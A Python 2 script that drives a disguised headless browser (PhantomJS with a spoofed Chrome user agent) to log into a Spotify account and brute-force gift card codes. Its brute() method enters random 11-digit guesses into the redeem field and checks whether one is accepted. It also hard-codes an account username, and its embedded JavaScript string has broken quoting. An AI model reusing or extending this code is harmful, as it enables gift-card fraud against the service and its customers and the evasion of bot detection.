from selenium.webdriver.common.keys import Keys
from selenium import webdriver
from fake_useragent import UserAgent
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import httpagentparser, random, time

useragent = UserAgent()

class Driver():
	def __init__(self):
		options = self.getCapability()
		self.driver = webdriver.PhantomJS("./phantomjs1.9.8", desired_capabilities=options)
		self.driver.set_window_size(1000,1000)
		self.loginAndRedirect()
		self.brute();
		self.driver.quit()

	def getCapability(self):
		phan_dict = webdriver.DesiredCapabilities.PHANTOMJS
		agent = useragent.chrome
		phan_dict["phantomjs.page.settings.userAgent"] = agent
		platform = httpagentparser.detect(agent)
		try:
			phan_dict["platform"] = platform["os"]["name"]
		except Exception,e:
			phan_dict["platform"] = "Windows"

		phan_dict["browserName"] = "Chrome"
		phan_dict["version"] = platform["browser"]["version"]
		
		return phan_dict

	def loginAndRedirect(self):
		#following would not work without set window size
		self.driver.get("https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F")
		wait = WebDriverWait(self.driver, 10)
		
		user_elem = wait.until(
			EC.presence_of_element_located((By.NAME, "username"))
		)
		user_elem.send_keys("jaretcolbert")

		pass_elem = wait.until(
			EC.presence_of_element_located((By.NAME, "password"))
		)
		pass_elem.send_keys("") #enter password here
		pass_elem.send_keys(Keys.RETURN)
	
		wait.until(
			EC.presence_of_element_located((By.PARTIAL_LINK_TEXT, "Redeem"))
		).click()

	
	def brute(self):
		for x in range(1):
			token_elem = self.driver.find_element_by_name("token")
			token_elem.clear()
			guess = self.getNextInt()
			print guess
			token_elem.send_keys(guess)
			token_elem.send_keys(Keys.RETURN)
			st = "var page = new WebPage();" \
				"page.onResourceReceived = function(response) {"\
  				"console.log('Response (#' + response.id + ', stage "' + response.stage + '"): ' + JSON.stringify(response));"\
				"};"
			print self.driver.execute_script(st)
			if self.isFound():
				print "Found it"
			else:
				print "Failed"

	def isFound(self):
		try:
			elem = WebDriverWait(self.driver, 10).until(
				EC.presence_of_element_located((By.CSS_SELECTOR, "p"))
			)
			if "If you've got a gift card" in elem.text:
				return False
			else:
				return True
		except Exception, e:
			print str(e)
			return True

	def getNextInt(self):
		length = 11
		start = 10 ** (length - 1)
		end = 10 ** length - 1
		return random.randint(start, end)

if __name__ == '__main__':
	Driver()